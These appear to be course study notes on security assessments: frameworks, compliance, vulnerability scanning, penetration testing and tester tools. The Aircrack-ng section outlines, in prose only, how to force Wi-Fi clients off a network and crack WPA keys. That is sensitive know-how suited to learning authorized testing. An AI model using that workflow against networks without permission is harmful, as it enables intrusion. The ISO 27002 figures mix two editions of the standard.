		○ Goal of a Security Controls Assessment

			§ Identify and document the security controls already implemented.

			§ Compare against a chosen framework to ensure coverage.

		○ Role of Frameworks

			§ Frameworks provide structured categories and sets of recommended controls (designed by governing bodies or standards organizations).

			§ Using a framework ensures consistency and alignment with best practices.

		○ Assessment Methodology

			§ Select a security control framework (e.g., NIST, ISO, CIS).

			§ Document whether each control exists in the organization.

			§ Optionally assign a quantitative score to reflect the perceived effectiveness of each control.

		○ How Assessments Are Conducted

			§ Typically based on:

				□ Interviews with technical staff.

				□ Analysis of reports, system configurations, and application settings.

			§ Results are not always exact measurements, but a mix of documented evidence and expert judgment.

		○ Outcome

			§ A prioritized list of security control gaps.

			§ Provides clarity on where the organization meets or falls short of framework expectations.

		○ Framework Overlap

			§ There are many frameworks, but most cover similar fundamental controls.

			§ Experienced practitioners recognize that frameworks are often just different ways of saying the same thing.

			§ The instructor highlights two major frameworks as most useful and practical (to be discussed next).



NIST and ISO

	• Both ISO (International Organization for Standardization) and NIST (National Institute of Standards and Technology) provide widely used security frameworks. ISO offers structured, organizational guidance for building an information security program, while NIST provides deep technical detail on security controls. Together, they complement each other for a robust security program.

	• Key Concepts

		○ ISO and IEC Collaboration

			§ ISO partnered with IEC to create international standards across industries.

			§ The ISO 27000 family (63+ standards) focuses on information security management.

		○ ISO Standards for Security

			§ ISO 27001 – the most recognized, provides the overall framework for Information Security Management Systems (ISMS).

			§ ISO 27002 – practical guidance, containing 114 specific controls across 14 domains, grouped into four themes:

				□ Organizational

				□ Physical

				□ People

				□ Technological

			§ Example: Information Security Policies is a domain with clear requirements for policy documentation.

		○ NIST Publications

			§ NIST publishes hundreds of guides on cybersecurity and IT.

			§ NIST Cybersecurity Framework (CSF):

				□ Five core categories: Identify, Protect, Detect, Respond, Recover.

				□ Helps organizations assess and manage risk within a governance context.

			§ NIST SP 800-53:

				□ Contains 1,000+ detailed controls in 18 control families (includes privacy).

				□ Categorizes controls by impact level: low, moderate, high.

				□ Originally written to support FISMA (Federal Information Security Management Act).

			§ Complementary Use

				□ ISO 27002 → guides how to organize a security program (strategic, governance-focused).

				□ NIST SP 800-53 → provides technical depth on implementing and managing security controls.

				□ Combining both gives organizations a comprehensive security posture.



Compliance Assessments

	• A compliance assessment evaluates whether an organization’s security program meets the requirements of an external authority (such as PCI DSS, HIPAA, or GLBA). Unlike other assessments that are voluntary and proactive, compliance assessments are mandatory, and failure to comply can have serious financial and operational consequences.

	• Key Concepts

		○ Purpose of a Compliance Assessment

			§ To ensure that an organization is meeting specific external requirements (legal, regulatory, or industry standards).

			§ Example: PCI DSS (Payment Card Industry Data Security Standard) applies to any organization that stores, processes, or transmits credit card data.

		○ Comparison to Security Controls Assessment

			§ Content looks very similar (controls, evidence, interviews, technology checks).

			§ Two key differences:

				□ Scope: Compliance frameworks are narrow and focused on specific types of data or risks (e.g., credit card data in PCI).

				□ Motivation: Other assessments are done voluntarily to improve security; compliance assessments are done because organizations are required to.

		○ Limitations of Compliance Standards

			§ Example: Building a security program only on PCI DSS would leave major gaps.

			§ Compliance does not equal full security; it only ensures minimum required protections.

		○ Methods of Evidence Collection

			§ Staff interviews.

			§ Reports and outputs from control technologies.

		○ Consequences of Non-Compliance

			§ Higher per-transaction fees charged by banks.

			§ In cases of willful negligence, banks may revoke the right to process credit card payments entirely.

			§ Strong financial and operational incentives drive compliance.

		○ Other Industries with Compliance Requirements

			§ Healthcare → HIPAA.

			§ Energy → NERC.

			§ Financial services → GLBA.

		○ Outcome of a Compliance Assessment

			§ Proof of compliance (attestation).

			§ Provides temporary assurance to auditors and regulators until the next review cycle.



Vulnerability Assessments

	• A vulnerability assessment is designed to ensure that technical weaknesses in systems, applications, and devices are regularly identified, evaluated, and remediated. It focuses on finding exploitable vulnerabilities that attackers could use and prioritizing them based on severity.

	• Key Concepts

		○ Goal of a Vulnerability Assessment

			§ Validate that vulnerabilities are identified and remediated on a recurring basis.

			§ Ensure organizations stay ahead of attackers by addressing weaknesses proactively.

		○ Exploitable Vulnerabilities

			§ Key focus is on vulnerabilities that an attacker could realistically exploit.

			§ Examples:

				□ Low risk: Missing patch that only allows directory listing.

				□ High/critical risk: SQL injection that exposes usernames and passwords.

		○ Scope of Assessment

			§ Should be broad and inclusive:

				□ Servers.

				□ Workstations.

				□ Mobile devices.

				□ Applications and databases.

			§ If it has an IP address, it should be scanned.

		○ Tools and Methods

			§ Typically conducted with automated scanning tools on a regular schedule.

			§ Best practices for scans:

				□ Authenticated scans of host systems.

				□ Unauthenticated scans of internet-facing applications.

				□ Authenticated scans of non-production app instances.

				□ Configuration scans of systems and applications.

			§ NIST provides additional manual assessment techniques to complement automation.

		○ Outcome

			§ A prioritized list of vulnerabilities based on severity and exploitability.

			§ Includes recommendations for remediation.



Penetration Tests

	• A penetration test is the most advanced form of security assessment, where testers go beyond identifying weaknesses and attempt to actively exploit them. It validates how vulnerabilities could be leveraged by attackers and provides realistic insight into an organization’s true security posture.

	• Key Concepts

		○ Penetration Test as the Pinnacle

			§ Unlike other assessments that stop at identifying weaknesses, a penetration test attempts to exploit them.

			§ Builds on the results of risk, vulnerability, compliance, and controls assessments.

		○ Scoping a Pentest

			§ Insights from prior assessments (e.g., vulnerability scans, network diagrams, firewall rules) help determine:

				□ Which systems and processes to test.

				□ Which attack methods to attempt.

			§ Scope and depth often depend on client preferences.

		○ Types of Penetration Tests

			§ White Box Testing

				□ Pentester receives extensive internal information (reports, configs, even source code).

				□ Focuses effort on testing the most relevant and high-risk areas.

			§ Black Box Testing

				□ Pentester starts with no internal knowledge, simulating an outside attacker.

				□ Most realistic but risks missing weaknesses due to limited visibility.

			§ Gray Box Testing

				□ Middle ground—tester gets partial internal knowledge.

				□ Balances realism with efficiency by narrowing focus while still simulating an outsider’s perspective.

				□ Most commonly used in practice.

		○ Pre-Engagement Phase

			§ The amount of knowledge shared with testers is negotiated before the assessment.

			§ Determines whether the test leans more toward white box, black box, or gray box.



Goals of a Pen Test

	• The goals of a penetration test should be clearly defined and tailored to the organization’s priorities within the CIA triad (Confidentiality, Integrity, Availability). The chosen objectives guide the scope of testing and ensure meaningful, ethical outcomes.

	• Key Concepts

		○ Common Pen Test Goals

			§ Many penetration tests aim to steal privileged credentials.

			§ Other possible goals include:

				□ Gaining access to the CFO’s inbox.

				□ Exfiltrating intellectual property.

				□ Extracting customer data.

		○ CIA Triad Influence

			§ The organization’s priorities around Confidentiality, Integrity, and Availability should shape the pen test goals.

			§ Confidentiality-focused goals → Stealing sensitive data (customer records, IP).

			§ Integrity-focused goals → Demonstrating unauthorized changes to systems or data.

			§ Availability-focused goals → Should be avoided, since disrupting production systems during a pen test causes real damage.

		○ Ethical and Professional Considerations

			§ Sensitive data compromised during a pen test must remain secret under non-disclosure agreements or professional codes of ethics.

			§ Exploiting integrity flaws carries risks of cleanup and potential production incidents.

			§ Exploiting availability vulnerabilities is unethical and equivalent to causing real harm.

		○ Defining Scope Based on Business Priorities

			§ The scope of the penetration test should align with what matters most to the organization.

			§ Proper scoping ensures tests are relevant, valuable, and safe.



The Security Assessment Lifecycle

	• The security assessment lifecycle integrates all five assessment types (risk, security controls, compliance, vulnerability, penetration) into a continuous, cyclical process. Each assessment feeds into the next, creating efficiencies and stronger results, while ensuring organizations continuously identify, prioritize, and mitigate risks.

	• Key Concepts

		○ Integration of Assessments

			§ Conducting all five assessments provides comprehensive visibility into exposures.

			§ They build on one another to improve efficiency and quality.



		○ Order of Assessments (Lifecycle Flow)

			§ Risk Assessment → Identify risks, likelihood, impact, and leadership’s risk appetite.

			§ Security Controls Assessment → Take stock of existing controls; evaluate their strength, cost, and complexity in relation to identified risks.

			§ Compliance Assessment → Use security controls assessment output to demonstrate alignment with external requirements (e.g., PCI DSS, HIPAA).

			§ Vulnerability Assessment → Use automated/manual tools to identify exploitable weaknesses across hosts, applications, and devices.

			§ Penetration Test → Attempt to exploit weaknesses, validate resilience, and simulate real-world attacks.

		○ Cyclical Process

			§ Findings from penetration testing feed into the next risk assessment, restarting the cycle.

			§ Security is continuous—“not a destination, but a journey.”

		○ Benefits of Lifecycle Approach

			§ Identifies likely threats and exposures.

			§ Ensures security controls are appropriate and effective.

			§ Demonstrates compliance to regulators and industry bodies.

			§ Tests organizational resilience against real attacks.

			§ Shifts focus from incident response to business as usual, by staying ahead of attackers.

#### Your Testing Environment



The Security Tester's Toolkit

	• Before starting any security assessment, a tester should prepare a well-organized toolkit (“Mise en Place”). Having the right tools ready, knowing how to use them, and understanding their output is essential for effective, efficient, and professional security testing.

	• Key Concepts

		○ Mise en Place for Security Testing

			§ Borrowed from cooking: “everything in its place.”

			§ Applied to security → prepare your toolkit before testing begins.

			§ Avoids wasting time or missing important steps during assessments.

		○ Toolkit Preparation

			§ Assemble tools before running scans or testing systems.

			§ Know:

				□ Where to find each tool.

				□ How to run it (commands, configurations).

				□ How to interpret its results.

		○ Role in Assessments

			§ Tool choice depends on pre-assessment or pre-engagement planning.

			§ Different assessments may require different tools, depending on scope, goals, and systems in play.

		○ Learning by Doing

			§ More than just knowing names of tools—testers should see them in action.

			§ Hands-on familiarity ensures confidence and competence during real engagements.

		○ Growth and Customization

			§ Instructor shares personal go-to tools but encourages testers to:

				□ Adapt and expand their toolkit over time.

				□ Add tools as they gain experience and maturity in the field.



Kali Linux

	• Kali Linux is a specialized Linux distribution widely used for penetration testing, but it also supports other types of security assessments. It comes preloaded with a wide range of security tools and can be run as a full operating system or as a virtual machine.

	• Key Concepts

		○ What is Kali Linux?

			§ A penetration testing Linux distribution.

			§ One of the most well-known and widely used in cybersecurity.

		○ Use Cases

			§ Primarily for penetration testing.

			§ Also supports:

				□ Vulnerability assessments.

				□ Certain types of security control assessments.

		○ Features

			§ Fully functional Linux operating system.

			§ Comes preloaded with numerous security tools (ready to use out of the box).

			§ Many downloads can be used as a full replacement OS.

		



Nmap

	• Nmap (Network Mapper) is a powerful and widely used tool for network discovery and scanning. It is included by default in Kali Linux, easy to start using, but offers advanced functionality that requires deeper learning and practice.

	• Key Concepts

		○ What is Nmap?

			§ Stands for Network Mapper.

			§ A tool used to identify systems on a network (host discovery, port scanning, service detection, etc.).

		○ Availability

			§ Downloadable from nmap.org.

			§ Zenmap: GUI-based version available for Windows users.

			§ In Kali Linux, Nmap is preinstalled—no setup needed.

		○ Ease of Use vs. Depth

			§ Simple to start: open terminal, type nmap.

			§ Difficult to master: advanced options and techniques take extensive practice.

			§ Known for being a tool that “takes a moment to learn and a lifetime to master.”

		○ Learning Resources

			§ The Nmap Cheat Sheet (highon.coffee) is recommended for practical, repeatable commands.

				□ https://highon.coffee/blog/nmap-cheat-sheet/



Nexxus

	• Nessus is a widely used host vulnerability scanner that goes beyond identifying active systems (like Nmap does) to detect specific technical vulnerabilities attackers could exploit. It is offered by Tenable in multiple versions, including a free option suitable for personal labs.

	• Key Concepts

		○ Purpose of Nessus

			§ Nmap: identifies live hosts and services.

			§ Nessus: identifies technical vulnerabilities on those hosts (missing patches, misconfigurations, weaknesses).

			§ Helps assess what attackers could actually exploit.

		○ Availability and Versions

			§ Provided by Tenable (tenable.com).

			§ Comes in different deployment models:

				□ Cloud-based scanners.

				□ Locally installed scanners.

			§ For training: Nessus Essentials (free edition).

		○ Nessus Essentials

			§ Can scan up to 16 IP addresses.

			§ Designed for home labs and learning purposes.

			§ Good starting point for security testers.

		○ Setup Requirements

			§ Registration with Tenable required (name + email).

			§ Activation code sent via email.

			§ Installer available for multiple OS options.

			§ Setup follows a simple “next, next, finish” process.

			§ If you choose not to register, you can still follow course demos.



Wireshark

	• Wireshark is a widely used tool for capturing and analyzing network packets, essential for network troubleshooting and security assessments. It allows testers to monitor traffic on specific network adapters, filter captures, and analyze communication flows in detail.

	• Key Concepts

		○ What is Wireshark?

			§ A packet capture and analysis tool.

			§ Available at wireshark.org, also preinstalled in Kali Linux.

		○ How It Works

			§ Displays all available network adapters on the system.

			§ Selecting an adapter (e.g., eth0 in Kali for the primary virtual adapter) starts traffic capture.

			§ The “any” adapter captures from all active adapters at once, but this may be messy or confusing.

		○ Capturing Traffic

			§ When capture starts, network activity is displayed visually (like a “heartbeat monitor”).

			§ Packets are saved to the local testing system for analysis.

			§ You can:

				□ Filter in real time while capturing.

				□ Capture everything and filter offline later (recommended for accuracy).

		○ Filtering Benefits

			§ Filters help narrow down relevant traffic (e.g., exclude your own machine’s traffic).

			§ However, depending on the test scenario, filtering out too much may miss important data.

			§ Best practice: capture all first, filter later for flexibility.

		○ Adaptability

			§ Users can tweak capture configurations as they gain experience.

			§ Wireshark’s flexibility makes it useful for both beginner testers and advanced analysts.



Lynis

	• Lynis is a security configuration assessment tool for Linux systems that evaluates system hardening and compliance. It provides both quick local scans and enterprise-level multi-system assessments, producing a hardening index score and detailed reports for remediation.

	• Key Concepts

		○ Purpose of Lynis

			§ Used for security configuration assessments on Linux systems.

			§ Validates how well a system is hardened against attacks.

		○ Versions of Lynis

			§ Open Source Version

				□ Lightweight (≈1000 lines of shell code).

				□ Suitable for scanning a single local/remote server or a single Docker file.

			§ Enterprise Version

				□ Paid.

				□ Designed for scanning multiple systems at scale.

		○ Assessment Output

			§ Onscreen results are color-coded for quick readability.

			§ Generates a hardening index (0–100) → a “How secure is this system?” score.

			§ Full scan results saved in /var/log/Lynis-report.dat.

		○ Customization

			§ After initial use, testers can modify the default.prf preferences file.

			§ Allows tailoring of which checks Lynis should perform.

		○ Integration with Benchmarks

			§ CIS Benchmarks (Center for Internet Security) can be used to interpret Lynis results.

			§ Provides industry-aligned guidance for improving configurations.

		



CIS-CAT Lite

	• CIS-CAT Lite is a free tool from the Center for Internet Security (CIS) that scans systems for security configuration weaknesses based on CIS Benchmarks. While limited in scope compared to the Pro version, it provides a starting point for organizations to assess compliance with secure configuration standards.

	• Key Concepts

		○ CIS Benchmarks

			§ Comprehensive technical guides for securing systems.

			§ Widely recognized as best practices for configuration hardening.

		○ CIS-CAT (Configuration Assessment Tool)

			§ Nessus vs. CIS-CAT:

				□ Nessus → scans for vulnerabilities (software flaws, missing patches).

				□ CIS-CAT → scans for configuration weaknesses (settings that don’t align with CIS Benchmarks).

		○ CIS-CAT Lite (Free Version)

			§ Available to registered users after providing contact info.

			§ Limited functionality: can only scan Windows 10, Ubuntu Linux, and Google Chrome.

			§ Serves as an introductory tool to show how the Pro version works.

		○ CIS-CAT Pro (Paid Version)

			§ Supports all CIS Benchmarks across many technologies.

			§ Includes CIS WorkBench → allows customization of benchmarks to match internal standards.

		○ Technical Requirements

			§ CIS-CAT Lite is a Java application.

			§ Requires Java to run → potential security concerns since Java has been a frequent target of exploits.

			§ Note: Java is preinstalled on Kali Linux, but installing it elsewhere should be done with caution.



Aircrack-ng

	• Aircrack-ng is a suite of tools used for testing the security of wireless networks. It enables penetration testers to analyze wireless encryption, capture traffic, and attempt to crack WEP, WPA, and WPA2 keys (with WPA3 being generally secure unless misconfigured).

	• Key Concepts

		○ Purpose of Aircrack-ng

			§ Designed for wireless network security testing.

			§ Commonly used in penetration tests where wireless is in scope.

		○ Setup Requirements

			§ Requires a compatible wireless network adapter (e.g., Alfa adapters with Realtek chipset).

			§ Kali Linux provides guidance on driver troubleshooting if needed.

		○ Encryption Detection \& Cracking

			§ Identifies wireless encryption types: Open (unencrypted), WEP, WPA, WPA2.

			§ WEP, WPA, WPA2 can potentially be cracked.

			§ WPA3 is considered secure unless misconfigured.

		○ Core Tools in the Suite

			§ airmon-ng → Starts a virtual wireless adapter for capturing traffic.

			§ airodump-ng → Monitors nearby access points (APs) and clients, can filter by MAC/hardware addresses.

			§ aireplay-ng → Launches deauthentication attacks, forcing clients to disconnect and reconnect.

			§ aircrack-ng → Attempts to crack the captured encryption keys using the 4-way handshake exchanged during reconnection.

		○ Workflow Summary

			§ Start monitoring with airmon-ng.

			§ Scan networks and clients with airodump-ng.

			§ Use aireplay-ng to deauthenticate a client.

			§ Capture the 4-way handshake during reconnection.

			§ Run aircrack-ng to attempt decryption of WEP/WPA/WPA2 keys.

		○ Learning Resources

			§ Official tutorials and guides at aircrack-ng.org.

			§ Step-by-step instructions maintained by developers.



Hashcat

	• Hashcat is one of the fastest and most powerful password-cracking tools available. It supports hundreds of hash types, is included in Kali Linux by default, and is highly effective in penetration testing when testers understand the context of the password source.

	• Key Concept

		○ Password Cracking Tools Landscape

			• Other well-known tools: John the Ripper, THC Hydra, L0phtCrack, RainbowCrack.

			• Hashcat stands out as one of the fastest and most capable.

		○ Why Hashcat is Popular

			• Installed by default on Kali Linux.

			• Extremely fast performance compared to alternatives.

			• Supports 350+ hash types, including widely used algorithms like MD5 and NTLM.

		○ Using Hashcat

			• Command: hashcat -h displays the help file, showing available options and capabilities.

			• The tool’s power lies in its wide range of modes, attack strategies, and optimizations.

		○ Success Factors in Cracking

			• Cracking effectiveness improves the more you know about the password source (e.g., complexity rules, likely patterns, wordlists).

			• Context and strategy matter as much as tool speed.

		○ Learning Approach

			• Instructor plans a demo to show Hashcat in action.

			• Hands-on practice helps reveal its full potential.



ÒWASP ZAP

	• OWASP ZAP (Zed Attack Proxy) is an open-source web application security scanner sponsored by OWASP (and more recently by Checkmarx). It is designed to identify vulnerabilities in web applications, offering both automated scans and manual testing tools, but must be used carefully since web app scanners can sometimes disrupt target applications.

	• Key Concepts

		○ Difference from Host Scanners

			§ Host vulnerability scanners:

				□ Signature-based → yes/no checks for known issues.

				□ Safer, less likely to disrupt systems.

			§ Web application scanners:

				□ More open-ended, simulate malicious user behavior.

				□ Higher risk of breaking or disrupting applications.

		○ Precautions in Web App Scanning

			§ Always test against non-production applications first.

			§ Adjust configurations to avoid unnecessary damage before testing production.

		○ Role of OWASP

			§ OWASP (Open Web Application Security Project): nonprofit dedicated to improving web app security.

			§ Provides open-source projects:

				□ Guides and standards (e.g., testing guides).

				□ Tools for automated and manual testing.

		○ OWASP ZAP

			§ Open-source web application security scanner.

			§ Features:

				□ Automated scanning for common vulnerabilities.

				□ Manual testing tools to support penetration testing.

			§ Installed by default in Kali Linux.

			§ Info and downloads at zaproxy.org.

		○ Project Sponsorship Update

			§ As of September 2024, ZAP’s dev team partnered with Checkmarx, who now sponsors the project.

			§ OWASP continues to maintain other projects, including intentionally vulnerable apps (e.g., Juice Shop) for training purposes.

		○ Training Use Case

			§ The course demonstrates ZAP by scanning Juice Shop, a deliberately vulnerable app for hands-on learning.



Prowler

	• Prowler is a cloud security posture management (CSPM) tool that checks cloud environments against security best practices and compliance requirements. It supports multiple cloud platforms, provides hundreds of checks based on dozens of frameworks, and is available as both an open-source and commercial solution.

	• Key Concepts

		○ Purpose of Prowler

			§ Authenticates to cloud environments.

			§ Runs security and compliance checks.

			§ Compares configurations against best practices and compliance frameworks.

		○ Availability

			§ Open source version (free, with CLI and GUI options).

			§ Commercial product with full support.

		○ Cloud and Platform Support

			§ Major providers: AWS, Azure, Google Cloud, Kubernetes, Microsoft 365

			§ Others: GitHub, NHN Cloud (NHN unofficial).

		○ Compliance and Security Standards

			§ Built around well-known frameworks:

				□ CIS Critical Security Controls.

				□ NIST Cybersecurity Framework.

				□ HIPAA, GDPR, SOC 2, etc.

			§ For AWS: ~600 unique checks across 40 compliance frameworks.

		○ Interfaces

			§ Command-line interface (CLI) for advanced users.

			§ Web-based GUI for those preferring visual management.

			§ Both available in the open-source version.

		○ Authentication Challenges

			§ The most complex part of setup is configuring authentication securely.

			§ Since it connects to sensitive cloud environments, proper configuration is critical.

			§ Supports multiple authentication methods, including MFA (multi-factor authentication).

			§ Documentation and guides at docs.prowler.com.





#### Planning Your Assessment



Understanding Your Assessment

	• Defining and confirming the scope of a security assessment is critical. It ensures you know which systems to test, keeps the client satisfied, and most importantly, protects you from legal or operational risks when working with third-party environments.

	• Key Concepts

		○ Impact of Assessment Type

			§ The type of assessment (risk, controls, compliance, vulnerability, penetration) influences how you scope the work.

			§ Each assessment type has different goals, targets, and requirements.

		○ Client Considerations

			§ The requester is always the client—whether internal or external.

			§ A happy client is more likely to bring repeat work, so communication and alignment are key.

		○ Defining Systems in Scope

			§ Ask for a list of systems to include:

				□ Hostnames.

				□ IP addresses.

				□ URLs.

			§ If only IP ranges are provided, you’ll need to determine which hosts are live.

		○ Authorization is Critical

			§ Confirm the client has authority to approve testing.

			§ Safe scenarios: client-owned on-premises systems.

			§ Risky scenarios: third-party systems (e.g., Salesforce, ServiceNow, AWS, Azure).

				□ Even if the client assumes permission, testing without explicit third-party approval can cause problems.

			§ Always get written authorization before testing.

		○ Risk Avoidance

			§ Testing third-party systems without approval can cause:

				□ Service disruption.

				□ Legal and compliance issues.

			§ Proper scoping and authorization prevent unnecessary risks.



Improving Over Time

	• Security assessments should be done strategically and consistently over time, not just tactically. Without a documented, repeatable methodology, organizations risk producing inconsistent results that prevent them from accurately measuring security improvements.

	• Key Concepts

		○ Tactical vs. Strategic Thinking

			§ Tactical: Treating each assessment as a one-time snapshot.

			§ Strategic: Looking at progress over time to measure security maturity.

		○ Importance of Measuring Improvement

			§ Security maturity requires tracking progress.

			§ Consistent assessments provide reliable data to demonstrate improvements and ROI to leadership.

		○ Scenario of Inconsistency

			§ Year 1: Experienced pentester (Dave) → focused on exploitation.

			§ Year 2: Vulnerability scanner expert (Deborah) → relied heavily on automated scanning.

			§ Year 3: Inexperienced consultant (Dylan) → used a generic checklist with limited expertise.

			§ Outcome: Reports are inconsistent, making it impossible to measure improvement across the three years.

		○ NIST Guidance

			§ NIST SP 800-115 (Technical Guide to Information Security Testing and Assessments) recommends:

				□ Documented methodologies.

				□ Repeatable processes.

			§ These ensure consistency, reliability, and measurable results across assessments.

		○ Avoiding the Pitfall

			§ Use a standardized, repeatable methodology.

			§ Select tools and approaches that align with organizational goals, not just tester preference.

			§ Focus on producing consistent, measurable outputs that leadership can track year over year.



Selecting Your Methodology

	• The choice of a security assessment methodology depends on the type of assessment being conducted. Different frameworks and standards provide structured approaches for risk, controls, and compliance assessments, helping organizations ensure consistency, effectiveness, and regulatory alignment.

	• Key Concepts

		○ Risk Assessment Methodologies

			§ NIST SP 800-30 Rev. 1 → Guide for conducting risk assessments; primarily qualitative.

			§ FAIR (Factor Analysis of Information Risk) → Offers a quantitative approach to assessing risk.

		○ Security Controls Assessment Methodologies

			§ NIST Cybersecurity Framework (CSF) → Comprehensive control set centered on governance.

			§ ISO/IEC 27002:2022 → Code of practice for information security controls; provides detailed control catalog.

		○ Compliance Assessments

			§ Driven by specific data types and regulatory requirements.

			§ Examples:

				□ PCI DSS → Applies to organizations handling credit card data.

					® Requirements vary depending on the volume of transactions.

					® Determines whether organizations can self-assess or must hire a certified third party.

				□ HIPAA (1996) → Applies to U.S. organizations handling ePHI (electronically protected health information).

					® Requires a security risk assessment aligned with HIPAA-mandated controls.

		○ Frequency and Scope of Compliance Assessments

			§ Determined by factors such as:

				□ Type of data processed.

				□ Volume of transactions or records handled.

				□ Applicable regulatory mandates.

		○ Unified Compliance Framework (UCF)

			§ Maps 800+ authority documents.

			§ Helps organizations identify which controls must be tested to achieve compliance with multiple overlapping standards/regulations.



Selecting Your Tools

	• When conducting vulnerability assessments (or penetration tests), the choice of tools and methodologies must align with the type of assessment, client needs, and consistency goals. A mix of commercial and open-source tools are available, and testers must also decide between authenticated vs. unauthenticated scans while ensuring consistent use of methodologies for measurable results over time.

	• Key Concepts

		○ Tool Categories for Vulnerability Assessments

			§ Host Vulnerability Scanners:

				□ Commercial: Nessus, Qualys VMDR.

				□ pen-source: OpenVAS (originally forked from Nessus).

			§ Web Application Vulnerability Scanners:

				□ Commercial: Veracode, AppScan, Sentinel, Acunetix, Checkmarx, Invicti (formerly Netsparker).

				□ Open-source / Community favorites: Burp Suite, OWASP ZAP.

		○ Authenticated vs. Unauthenticated Scans

			§ Unauthenticated scans:

				□ Simulate an outsider’s perspective.

				□ Safer for production systems but less detailed.

			§ Authenticated scans:

				□ Simulate a trusted insider’s perspective.

				□ Provide more accurate, detailed results.

				□ Carry higher risk of impacting production systems.

			§ Best practices:

				□ Run unauthenticated scans on internet-facing systems.

				□ Run authenticated scans on internal production hosts and non-production app instances.

		○ Penetration Testing Methodologies

			§ Tester skill and experience affect methodology variance.

			§ Common standards:

				□ PTES (Penetration Testing Execution Standard) → widely recommended.

				□ OSSTMM (Open-Source Security Testing Methodology Manual) → robust resource.

		○ Manual Testing Resources

			§ OWASP Web Security Testing Guide → manual testing for web apps.

			§ OWASP Mobile Security Testing Guide → manual testing for mobile apps.

			§ CIS Benchmarks → detailed configuration guidance for systems, networks, and databases.

		○ Consistency Across Assessments

			§ Select methodologies that align with client needs and expectations.

			§ Use the same methodologies across multiple assessments to:

				□ Ensure consistent results.

				□ Enable tracking of progress over time.



Basic Assessment Tools

	• Once scope and methodology are set, choosing tools for security assessments is straightforward. The right choice depends on budget, complexity, and collaboration needs, with different tools fitting risk assessments, security controls assessments, and ISO-aligned organizations.

	• Key Concepts

		○ Factors in Tool Selection

			§ Budget: What can the organization afford?

			§ Complexity: How steep is the learning curve?

			§ Collaboration: Is the assessment individual or team-based?

		○ Tools for Risk Assessments

			§ Often don’t require complex automated tools.

			§ Many consultants rely on custom spreadsheet tools with built-in scoring.

			§ Example: SimpleRisk → offers pre-configured virtual machines for easy setup, plus a hosted option.

		○ Tools for Security Controls Assessments

			§ Traditionally done with spreadsheets to capture responses and insights.

			§ Recently, some have moved to SaaS-based solutions.

			§ Emphasis is on Q\&A discussions with staff responsible for controls.

		○ ISO-Specific Resources

			§ ISO 27K Toolkit (ISO27001security.com): free collection of documents, spreadsheets, PowerPoints, etc.

			§ Helps assess against ISO/IEC 27001 and 27002.

			§ Good starter resource before purchasing the official standards.

			§ Official standards available at iso.org.



Advanced Assessments Tools

	• Advanced assessment tools extend beyond basic scanners and are often tied to specific compliance requirements, penetration testing methodologies, or web application testing. Many authoritative organizations and community-driven projects provide curated lists of tools that security testers should reference and use.

	• Key Concepts

		○ Compliance Assessment Tools

			§ Often provided by the compliance authority itself.

			§ Examples:

				□ PCI DSS → self-assessment questionnaires available at pcisecuritystandards.org.

				□ HIPAA → security risk assessment tool available from OCR/ONC (free download).

		○ Vulnerability \& Penetration Testing Tools

			§ Best starting point: methodology guides.

			§ PTES (Penetration Testing Execution Standard) → references technical tools at pentest-standard.org.

			§ OSSTMM (Open Source Security Testing Methodology Manual) → additional resource at isecom.org.

		○ Web Application Testing Tools

			§ OWASP provides curated lists of application security testing tools.

			§ These lists are among the most comprehensive and up-to-date for web app security.

			§ Should be bookmarked as a go-to resource.

		○ General Security Tools

			§ SecTools.org → contains a “Top 125 Network Security Tools” list.

			§ While somewhat dated, many tools listed remain highly relevant.

			§ Useful for rounding out knowledge of network and security testing tools.



#### Review Techniques



Documentation Review

	• A documentation review evaluates whether an organization’s security documentation (policies, standards, guidelines, and procedures) is complete, cohesive, reasonable, and actually implemented in practice. It ensures alignment with compliance requirements, control frameworks, and practical security goals.

	• Key Concepts

		○ ISACA’s Four Key Documentation Types

			§ Policies → High-level principles the organization commits to.

			§ Standards → Mandatory requirements to meet policy goals.

			§ Guidelines → Flexible instructions for areas not fully covered by standards (often technology-specific).

			§ Procedures → Step-by-step, prescriptive instructions for implementation.

		○ Relationships Among Documents

			§ Example: Mobile Security

				□ Policy → Secure use of mobile devices.

				□ Standards → Required device/app security settings.

				□ Guidelines → Supplemental advice for new OS or app versions.

				□ Procedures → Instructions for applying those settings.

			§ Cohesiveness is critical: remediation should start with policies and flow downward.

		○ Completeness of Documentation

			§ Documentation requirements depend on:

				□ Compliance obligations.

				□ Selected security control frameworks.

			§ Organizations should compile a list of required docs based on standards/regulations.

		○ Criteria to Evaluate Documents

			§ Last review date.

			§ Reviewer and approver (sign-off).

			§ Scope definition.

			§ Policy alignment with reasonable security practices.

			§ Technical standards aligned with best practices (e.g., CIS Benchmarks → adjusted to avoid over-implementation or unnecessary cost).

		○ Critical Review Question

			§ “Are they really doing this?”

			§ Many organizations create documentation but never implement it, leading to a false sense of security.

		○ Supporting Documentation to Review

			§ Architectural diagrams (Visio, Figma, etc.).

			§ System Security Plans (SSPs) → Narratives on how controls are implemented.

			§ Third-party contracts → Ensure data protection clauses are included.

			§ Security incident response plans → Documented and tested.

			§ Disaster recovery \& business continuity plans → Preparedness for operational disruptions.



Log Review

	• Log reviews are critical for visibility into system and user activity, threat detection, and incident investigation. Logs should be collected and configured for security value—not just for compliance—and reviews should ensure both proper activation and configuration of logging across systems.

	• Key Concepts

		○ Purpose of Logs

			§ Not just for compliance—logs must provide security insight.

			§ Offer visibility into:

				□ System-to-system communication.

				□ User activities within applications.

				□ Potential threats or suspicious events.

		○ Value of Log Analysis

			§ Helps detect:

				□ Malicious login attempts from suspicious IPs.

				□ Reconnaissance activity before an attack.

				□ Unauthorized privilege escalations (e.g., new global admin at odd hours).

		○ Critical Log Settings to Review

			§ Authentication attempts: especially failed and sensitive login attempts.

			§ Privileged account activity.

			§ System/service startup and shutdown events.

			§ Network metadata: source IP, destination IP, date, time.

			§ Goal: enough context to identify what happened, where, and when.

		○ Documentation to Review First

			§ Logging and monitoring policies and standards, focusing on:

				□ Activation → Which systems are required to have logging enabled?

				□ Configuration → What specific log settings must be applied?

		○ Security vs. Compliance

			§ Compliance requirements provide a baseline, but compliance alone is insufficient.

			§ Effective log management requires strategic collection and analysis.



Log Management Tools

	• Effective log management goes beyond collecting server logs—it requires aggregating multiple log sources, centralizing storage, ensuring consistency, and using tools (log management or SIEM) to analyze data. Without proper tools and retention, organizations risk losing critical forensic evidence during incidents.

	• Key Concept

		○ Beyond Server Logs

			§ Server OS logs are important, but insufficient.

			§ Organizations should also collect:

				□ Application logs

				□ Database logs

				□ Web server logs

				□ Endpoint activity logs

		○ Challenges in Log Management

			§ Storage requirements can be massive in large enterprises.

			§ Logs should be stored on a centralized server.

